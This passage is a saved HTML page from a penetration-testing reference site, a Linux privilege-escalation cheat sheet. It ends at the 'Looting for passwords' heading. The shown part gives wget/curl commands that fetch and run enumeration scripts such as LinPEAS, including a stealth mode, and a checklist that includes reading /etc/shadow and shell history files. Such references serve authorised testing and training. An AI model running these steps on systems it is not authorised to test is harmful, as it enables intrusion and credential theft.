@@ -1,0 +1,2475 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Tips, tricks, techniques and methodologies for escalating privileges in a linux environment.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Linux - Privilege Escalation" />
+<meta property="og:description" content="Tips, tricks, techniques and methodologies for escalating privileges in a linux environment." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/linux_privilege_escalation/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2022-11-03T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-11-03T00:00:00+00:00" />
+<title>Linux - Privilege Escalation | Gray Hat Freelancing</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.afc3b3563d1884d85d5f5db04c9a930f7d7c354fdac44481534920d345015a5b.js" integrity="sha256-r8OzVj0YhNhdX12wTJqTD318NU/axESBU0kg00UBWls=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-124168691-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script><!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+  
+
+
+
+  
+    
+  
+    
+  
+
+
+
+<ul class="book-languages">
+  <li>
+    <input type="checkbox" id="languages" class="toggle" />
+    <label for="languages" class="flex justify-between">
+      <a role="button" class="flex align-center">
+        <img src="/svg/translate.svg" class="book-icon" alt="Languages" />
+        English
+      </a>
+    </label>
+
+    <ul>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/ru/">
+          Russian
+        </a>
+      </li>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/zh/">
+          Chinese
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <a href="/docs/example/" class="">Example Site</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/" class="">Table of Contents</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/with-toc/" class="">With ToC</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/without-toc/" class="">Without ToC</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4e46b01272d410b3a99461d79326ddf4" class="toggle"  />
+    <label for="section-4e46b01272d410b3a99461d79326ddf4" class="flex justify-between">
+      <a role="button" class="">Collapsed</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/" class="">3rd Level</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/4th-level/" class="">4th Level</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tryhackme_olympus/" class="">Olympus - TryHackMe Walkthrough</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/wordpress/" class="">Wordpress Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_hardening/" class="">Windows - Hardening</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_amsi_bypass/" class="">Bypassing AMSI protections</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/subdomains_enumeration/" class="">Enumerating Subdomains</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_mimikatz/" class="">Windows - Mimikatz</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_persistence/" class="">Windows - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_privilege_escalation/" class="">Windows - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_using_credentials/" class="">Windows - Using Credentials</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_download_and_execute/" class="">Windows Download and Execute Methods</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/escape_breakout/" class="">Application Escape and Breakout</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/office_attacks/" class="">Attacking Office</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/methodology_and_enumeration/" class="">Bug Hunting Methodology and Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/hash_cracking/" class="">Hash Cracking Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_persistence/" class="">Linux - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_privilege_escalation/" class="active">Linux - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/metasploit_cheatsheet/" class="">Metasploit</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_dpapi/" class="">Microsoft Window&#39;s Data Protection API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_discovery/" class="">Network Discovery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_pivoting_techniques/" class="">Network Pivoting Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/mssql_server_cheatsheet/" class="">Pentesting MSSQL Server Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/powershell_cheatsheet/" class="">Powershell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/reverse_shell_cheatsheet/" class="">Reverse Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/source_code_management/" class="">Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/miscellaneous_tricks/" class="">Miscellaneous Tips and Tricks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/graphql_injection/" class="">GraphQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csv_injection/" class="">Csv Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/command_injection/" class="">Command Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dns_rebinding/" class="">DNS Rebinding</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/http_parameter_pollution/" class="">HTTP Parameter Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_direct_object_references/" class="">Insecure Direct Object References</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_file_uploads/" class="">Insecure File Upload</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_management_interfaces/" class="">Insecure Management Interface</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_source_code_management/" class="">Insecure Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/java_rmi/" class="">Java RMI</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/json_web_token/" class="">JSON Web Tokens</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/kuburnetes/" class="">Kuburnetes</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/latex_injection/" class="">LaTeX Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ldap_injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/nosql_injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/oauth/" class="">OAuth</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/open_url_redirection/" class="">Open URL Redirection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/race_conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/request_smuggling/" class="">Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/saml_injection/" class="">SAML Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_request_forgery/" class="">Server-Side Request Forgery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_template_injection/" class="">Server-Side Template Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/sql_injection/" class="">SQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tabnabbing/" class="">Tabnabbing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/type_juggling/" class="">Type Juggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_cache_deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_sockets/" class="">Web Sockets Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xxe_injection/" class="">XML eXternal Entity Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xpath_injection/" class="">XPATH Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xslt_injection/" class="">XSLT Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xss_injection/" class="">XSS Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Shortcodes</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/buttons/" class="">Buttons</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/columns/" class="">Columns</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/details/" class="">Details</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/expand/" class="">Expand</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/hints/" class="">Hints</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/katex/" class="">Katex</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/mermaid/" class="">Mermaid</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="toggle"  />
+    <label for="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="flex justify-between">
+      <a href="/docs/shortcodes/section/" class="">Section</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/first-page/" class="">First Page</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/second-page/" class="">Second Page</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/tabs/" class="">Tabs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/"  >
+        Blog
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
+        Contribute
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Linux - Privilege Escalation</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#linux---privilege-escalation">Linux - Privilege Escalation</a>
+      <ul>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#checklists">Checklists</a></li>
+        <li><a href="#looting-for-passwords">Looting for passwords</a>
+          <ul>
+            <li><a href="#files-containing-passwords">Files containing passwords</a></li>
+            <li><a href="#old-passwords-in-etcsecurityopasswd">Old passwords in /etc/security/opasswd</a></li>
+            <li><a href="#last-edited-files">Last edited files</a></li>
+            <li><a href="#in-memory-passwords">In memory passwords</a></li>
+            <li><a href="#find-sensitive-files">Find sensitive files</a></li>
+          </ul>
+        </li>
+        <li><a href="#ssh-key">SSH Key</a>
+          <ul>
+            <li><a href="#sensitive-files">Sensitive files</a></li>
+            <li><a href="#ssh-key-predictable-prng-authorized_keys-process">SSH Key Predictable PRNG (Authorized_Keys) Process</a></li>
+          </ul>
+        </li>
+        <li><a href="#scheduled-tasks">Scheduled tasks</a>
+          <ul>
+            <li><a href="#cron-jobs">Cron jobs</a></li>
+          </ul>
+        </li>
+        <li><a href="#systemd-timers">Systemd timers</a></li>
+        <li><a href="#suid">SUID</a>
+          <ul>
+            <li><a href="#find-suid-binaries">Find SUID binaries</a></li>
+            <li><a href="#create-a-suid-binary">Create a SUID binary</a></li>
+          </ul>
+        </li>
+        <li><a href="#capabilities">Capabilities</a>
+          <ul>
+            <li><a href="#list-capabilities-of-binaries">List capabilities of binaries</a></li>
+            <li><a href="#edit-capabilities">Edit capabilities</a></li>
+            <li><a href="#interesting-capabilities">Interesting capabilities</a></li>
+          </ul>
+        </li>
+        <li><a href="#sudo">SUDO</a>
+          <ul>
+            <li><a href="#nopasswd">NOPASSWD</a></li>
+            <li><a href="#ld_preload-and-nopasswd">LD_PRELOAD and NOPASSWD</a></li>
+            <li><a href="#doas">Doas</a></li>
+            <li><a href="#sudo_inject">sudo_inject</a></li>
+            <li><a href="#cve-2019-14287">CVE-2019-14287</a></li>
+          </ul>
+        </li>
+        <li><a href="#gtfobins">GTFOBins</a></li>
+        <li><a href="#wildcard">Wildcard</a></li>
+        <li><a href="#writable-files">Writable files</a>
+          <ul>
+            <li><a href="#writable-etcsysconfignetwork-scripts-centosredhat">Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)</a></li>
+            <li><a href="#writable-etcpasswd">Writable /etc/passwd</a></li>
+            <li><a href="#writable-etcsudoers">Writable /etc/sudoers</a></li>
+          </ul>
+        </li>
+        <li><a href="#nfs-root-squashing">NFS Root Squashing</a></li>
+        <li><a href="#shared-library">Shared Library</a>
+          <ul>
+            <li><a href="#ldconfig">ldconfig</a></li>
+            <li><a href="#rpath">RPATH</a></li>
+          </ul>
+        </li>
+        <li><a href="#groups">Groups</a>
+          <ul>
+            <li><a href="#docker">Docker</a></li>
+            <li><a href="#lxclxd">LXC/LXD</a></li>
+          </ul>
+        </li>
+        <li><a href="#hijack-tmux-session">Hijack TMUX session</a></li>
+        <li><a href="#kernel-exploits">Kernel Exploits</a>
+          <ul>
+            <li><a href="#cve-2022-0847-dirtypipe">CVE-2022-0847 (DirtyPipe)</a></li>
+            <li><a href="#cve-2016-5195-dirtycow">CVE-2016-5195 (DirtyCow)</a></li>
+            <li><a href="#cve-2010-3904-rds">CVE-2010-3904 (RDS)</a></li>
+            <li><a href="#cve-2010-4258-full-nelson">CVE-2010-4258 (Full Nelson)</a></li>
+            <li><a href="#cve-2012-0056-mempodipper">CVE-2012-0056 (Mempodipper)</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="linux---privilege-escalation">
+  Linux - Privilege Escalation
+  <a class="anchor" href="#linux---privilege-escalation">#</a>
+</h1>
+<h2 id="tools">
+  Tools
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<p>There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escelation vectors.
+Here are a few:</p>
+<ul>
+<li>
+<p>
+  <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS - Linux Privilege Escalation Awesome Script</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>wget <span style="color:#e6db74">&#34;https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh&#34;</span> -O linpeas.sh
+</span></span><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh&#34;</span> -o linpeas.sh
+</span></span><span style="display:flex;"><span>./linpeas.sh -a <span style="color:#75715e">#all checks - deeper system enumeration, but it takes longer to complete.</span>
+</span></span><span style="display:flex;"><span>./linpeas.sh -s <span style="color:#75715e">#superfast &amp; stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.</span>
+</span></span><span style="display:flex;"><span>./linpeas.sh -P <span style="color:#75715e">#Password - Pass a password that will be used with sudo -l and bruteforcing other users</span>
+</span></span></code></pre></div></li>
+<li>
+<p>
+  <a href="https://github.com/liamg/traitor">Traitor - Linux Privielege Escalation</a></p>
+<pre tabindex="0"><code class="language-Automatically" data-lang="Automatically">
+Nearly all of GTFOBins
+Writeable docker.sock
+CVE-2022-0847 (Dirty pipe)
+CVE-2021-4034 (pwnkit)
+CVE-2021-3560
+</code></pre></li>
+<li>
+<p>
+  <a href="https://github.com/diego-treitos/linux-smart-enumeration">LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>wget <span style="color:#e6db74">&#34;https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh&#34;</span> -O lse.sh
+</span></span><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh&#34;</span> -o lse.sh
+</span></span><span style="display:flex;"><span>./lse.sh -l1 <span style="color:#75715e"># shows interesting information that should help you to privesc</span>
+</span></span><span style="display:flex;"><span>./lse.sh -l2 <span style="color:#75715e"># dump all the information it gathers about the system</span>
+</span></span></code></pre></div></li>
+<li>
+<p>
+  <a href="https://github.com/rebootuser/LinEnum">LinEnum - Scripted Local Linux Enumeration &amp; Privilege Escalation Checks</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
+</span></span></code></pre></div></li>
+<li>
+<p>
+  <a href="https://github.com/AlessandroZ/BeRoot">BeRoot - Privilege Escalation Project - Windows / Linux / Mac</a></p>
+</li>
+<li>
+<p>
+  <a href="https://github.com/sleventyeleven/linuxprivchecker">linuxprivchecker.py - a Linux Privilege Escalation Check Script</a></p>
+</li>
+<li>
+<p>
+  <a href="https://github.com/pentestmonkey/unix-privesc-check">unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check</a></p>
+</li>
+<li>
+<p>
+  <a href="https://github.com/TH3xACE/SUDO_KILLER">Privilege Escalation through sudo - Linux</a></p>
+</li>
+</ul>
+<h2 id="checklists">
+  Checklists
+  <a class="anchor" href="#checklists">#</a>
+</h2>
+<ul>
+<li>Kernel and distribution release details</li>
+<li>System Information:
+<ul>
+<li>Hostname</li>
+<li>Networking details:</li>
+<li>Current IP</li>
+<li>Default route details</li>
+<li>DNS server information</li>
+</ul>
+</li>
+<li>User Information:
+<ul>
+<li>Current user details</li>
+<li>Last logged on users</li>
+<li>Shows users logged onto the host</li>
+<li>List all users including uid/gid information</li>
+<li>List root accounts</li>
+<li>Extracts password policies and hash storage method information</li>
+<li>Checks umask value</li>
+<li>Checks if password hashes are stored in /etc/passwd</li>
+<li>Extract full details for &lsquo;default&rsquo; uid&rsquo;s such as 0, 1000, 1001 etc</li>
+<li>Attempt to read restricted files i.e. /etc/shadow</li>
+<li>List current users history files (i.e .bash_history, .nano_history, .mysql_history , etc.)</li>
+<li>Basic SSH checks</li>
+</ul>
+</li>
+<li>Privileged access:
+<ul>
+<li>Which users have recently used sudo</li>
+<li>Determine if /etc/sudoers is accessible</li>
+<li>Determine if the current user has Sudo access without a password</li>
+<li>Are known &lsquo;good&rsquo; breakout binaries available via Sudo (i.e. nmap, vim etc.)</li>
+<li>Is root&rsquo;s home directory accessible</li>
+<li>List permissions for /home/</li>
+</ul>
+</li>
+<li>Environmental:
+<ul>
+<li>Display current $PATH</li>
+<li>Displays env information</li>
+</ul>
+</li>
+<li>Jobs/Tasks:
+<ul>
+<li>List all cron jobs</li>
+<li>Locate all world-writable cron jobs</li>
+<li>Locate cron jobs owned by other users of the system</li>
+<li>List the active and inactive systemd timers</li>
+</ul>
+</li>
+<li>Services:
+<ul>
+<li>List network connections (TCP &amp; UDP)</li>
+<li>List running processes</li>
+<li>Lookup and list process binaries and associated permissions</li>
+<li>List inetd.conf/xined.conf contents and associated binary file permissions</li>
+<li>List init.d binary permissions</li>
+</ul>
+</li>
+<li>Version Information (of the following):
+<ul>
+<li>Sudo</li>
+<li>MYSQL</li>
+<li>Postgres</li>
+<li>Apache
+<ul>
+<li>Checks user config</li>
+<li>Shows enabled modules</li>
+<li>Checks for htpasswd files</li>
+<li>View www directories</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Default/Weak Credentials:
+<ul>
+<li>Checks for default/weak Postgres accounts</li>
+<li>Checks for default/weak MYSQL accounts</li>
+</ul>
+</li>
+<li>Searches:
+<ul>
+<li>Locate all SUID/GUID files</li>
+<li>Locate all world-writable SUID/GUID files</li>
+<li>Locate all SUID/GUID files owned by root</li>
+<li>Locate &lsquo;interesting&rsquo; SUID/GUID files (i.e. nmap, vim etc)</li>
+<li>Locate files with POSIX capabilities</li>
+<li>List all world-writable files</li>
+<li>Find/list all accessible *.plan files and display contents</li>
+<li>Find/list all accessible *.rhosts files and display contents</li>
+<li>Show NFS server details</li>
+<li>Locate *.conf and *.log files containing keyword supplied at script runtime</li>
+<li>List all *.conf files located in /etc</li>
+<li>Locate mail</li>
+</ul>
+</li>
+<li>Platform/software specific tests:
+<ul>
+<li>Checks to determine if we&rsquo;re in a Docker container</li>
+<li>Checks to see if the host has Docker installed</li>
+<li>Checks to determine if we&rsquo;re in an LXC container</li>
+</ul>
+</li>
+</ul>
+<h2 id="looting-for-passwords">
+  Looting for passwords
